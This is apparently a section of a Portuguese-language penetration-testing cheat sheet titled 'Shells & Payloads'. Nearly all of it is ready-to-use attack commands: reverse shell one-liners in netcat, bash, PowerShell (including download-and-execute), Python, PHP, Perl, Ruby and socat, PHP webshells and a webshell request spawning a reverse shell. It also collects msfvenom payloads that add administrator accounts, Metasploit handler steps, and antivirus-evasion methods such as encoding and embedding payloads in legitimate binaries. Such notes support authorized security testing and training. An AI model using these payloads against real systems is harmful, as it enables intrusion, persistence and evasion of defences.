# 5. Shells & Payloads

### 5.1 Reverse Shells

**Netcat**
```bash
# listener (kali):
rlwrap nc -nlvp 4444
# target:
nc -nv <kali> 4444 -e /bin/bash
nc.exe <kali> 4444 -e cmd.exe
# sem -e:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali> 4444 >/tmp/f
```

**Bash**
```bash
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
bash -c "0<&196;exec 196<>/dev/tcp/10.10.14.6/4444; sh <&196 >&196 2>&196"
```

**PowerShell**
```powershell
# flags: -NoP (sem profile) -NonI (não interativo) -Exec Bypass -W Hidden (janela oculta)
powershell -NoP -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1')";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 666
# 64-bit a partir de processo 32-bit:
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

**Python**
```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.6",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

**PHP / Perl / Ruby**
```bash
php -r '$sock=fsockopen("10.10.14.6",666);exec("/bin/bash -i <&3 >&3 2>&3");'
perl -e 'use Socket;$i="10.10.14.4";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Socat** (shell full/estável)
```bash
# kali:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<kali>:4444
```

**Outros**: `msfvenom -p java/jsp_shell_reverse_tcp ... -f war > runme.war` (Tomcat/Jenkins groovy), `msiexec /q /i http://10.10.10.1/1.msi`, xterm (`Xnest :1; xhost +target; xterm -display <kali>:1`).

### 5.2 Estabilizar TTY (a mágica do Phineas Fisher)
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# de volta na shell:
reset; export SHELL=bash; export TERM=xterm-256color; stty rows 38 columns 116
```
GTFO shells: `vi :!bash` · `awk 'BEGIN{system("/bin/bash")}'` · `perl -e 'exec "/bin/sh";'` · `nmap --interactive` → `!sh`.

### 5.3 Webshells

**PHP lite**
```php
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```
**Weevely**
```bash
weevely generate <senha> /tmp/payload.php
weevely http://$IP/payload.php <senha>
```
Kali: `/usr/share/webshells/`

**Requisição de webshell urlencoded:**
```bash
curl -X POST http://$IP/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1"'
```

### 5.4 msfvenom — coleção
```bash
msfvenom -l payloads
# Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
msfvenom -p windows/shell/reverse_tcp     LHOST=<ip> LPORT=<port> -f exe > shell.exe
msfvenom -p windows/adduser USER=hacker PASS='Hacker123$' -f exe > adduser.exe
# Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
# Web:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
# Scripting:
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
# DLL / MSI:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o evil.dll
msfvenom -p windows/exec CMD='net localgroup administrators pwn /add' -f msi-nouac -o setup.msi
```

### 5.5 Metasploit — básico
```text
msfconsole
use auxiliary/scanner/snmp/snmp_enum
set RHOST $IP; set THREADS 10; run
# multi/handler:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>; set LPORT <port>; exploit
# meterpreter:
sysinfo | getuid | shell | upload /path nc.exe C:\\Users\\ | download C:\\file /tmp/
```

### 5.6 Compilar & bypass de AV
```bash
# Cross-compile p/ Windows a partir do Linux:
x86_64-w64-mingw32-gcc exploit.c -o out.exe          # 64-bit
i686-w64-mingw32-gcc  exploit.c -o out.exe -lws2_32  # 32-bit
gcc -m32 -o out32 hello.c                            # 32-bit nativo
# Python → exe:
pip install pyinstaller && pyinstaller --onefile exploit.py
```
**Bypass de AV**:
```bash
# encoder:
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -e x86/shikata_ga_nai -i 9 -f exe -o enc.exe
# embutir em binário legítimo:
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -e x86/shikata_ga_nai -i 9 -x plink.exe -f exe -o embed.exe
# criptografar: Hyperion / Veil / Shelter / the-backdoor-factory
```
